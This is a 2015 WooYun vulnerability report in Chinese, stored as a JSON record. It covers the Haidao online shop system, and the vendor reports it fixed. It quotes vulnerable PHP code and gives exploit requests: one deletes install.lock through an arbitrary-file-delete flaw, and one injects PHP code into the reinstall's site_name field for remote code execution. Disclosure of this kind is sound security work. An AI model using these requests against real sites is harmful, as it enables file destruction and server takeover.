{"id": 84862, "wybug_id": "wooyun-2015-0139987", "wybug_title": "Haidao网店系统最新版任意文件删除&amp;&amp;前台getshell", "wybug_corp": "www.haidao.la", "wybug_author": "%270x5c", "wybug_date": "2015-09-10 14:22", "wybug_open_date": "2015-12-10 12:44", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-10：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： v1.12.3.150828 详细说明：  #1在 /appliaction/Controller/User/OrderReturnController.class.php中有一段很可怕的代码= =\npublic function delete_img() {\t\t$img_url = $_SERVER['DOCUMENT_ROOT'].$_GET['img_url'];\t\t\t\tif (file_exists($img_url)) {\t\t\t$result = unlink($img_url);\t\t}\t\t$result ? showmessage('文件删除成功','',1) : showmessage('文件删除失败') ;\t}\n这个文件继承的 UserBaseController。 那么也就是说随意注册个用户即可执行这段代码。由于$_GET['img_url']可控，可以删除全站任意文件#2post 提交\nhttp://localhost/index.php?m=user&c=OrderReturn&a=delete_imgimg_url=/install/install.lock\n\n\n然后看到www/install/include/function.php\n.......$site_name \t  = url_get('site_name');\t$site_keywords \t= url_get('site_keywords');\t$site_description    \t= url_get('site_description');.....$configDefFile = ROOT_PATH.'./install/site.php';\t$configFile    = ROOT_PATH.'./config/site.php';\t$updateData    = array(\t\t'{SITE_NAME}' \t\t=> $site_name,\t\t'{SITE_KEYWORDS}' \t=> $site_keywords,\t\t'{SITE_DESCRIPTION}'=> $site_description,\t\t'{SITE_KEY}'\t\t=> generate_password(),\t);\t$is_success = create_config($configFile,$configDefFile,$updateData);\n这里可以写入文件。在 install/index.php中有个逻辑错误\nif(get_magic_quotes_gpc()) //应该是 if(!get_magic_quotes_gpc()) 吧{\t$_POST    = stripSlash($_POST);\t$_GET     = stripSlash($_GET);\t$_COOKIE  = stripSlash($_COOKIE);}\n综上。在自己的服务器开启mysql外连。post提交http://localhost:801//install/index.php?act=install_4\ndb_address=远程mysqlip&db_name=**&db_user=**&db_pwd=**&db_pre=hd_&site_name=a','a'=>phpinfo(),//&site_keywords=aaaaaaaa&site_description=aaaaaaaa&admin_user=admin&admin_pwd=admina&admin_email=adminaaa%40qq.coim\n即可getshell。\n\n由于会重装系统，所以就不demo测试了。   漏洞证明：  \n\n\n\n   修复方案：  补。   版权声明：转载请注明来源 %270x5c@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-09-11 12:42 厂商回复： 感谢对海盗云商的关注，我们会尽快修复！ 最新状态： 2015-09-15：已修复  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}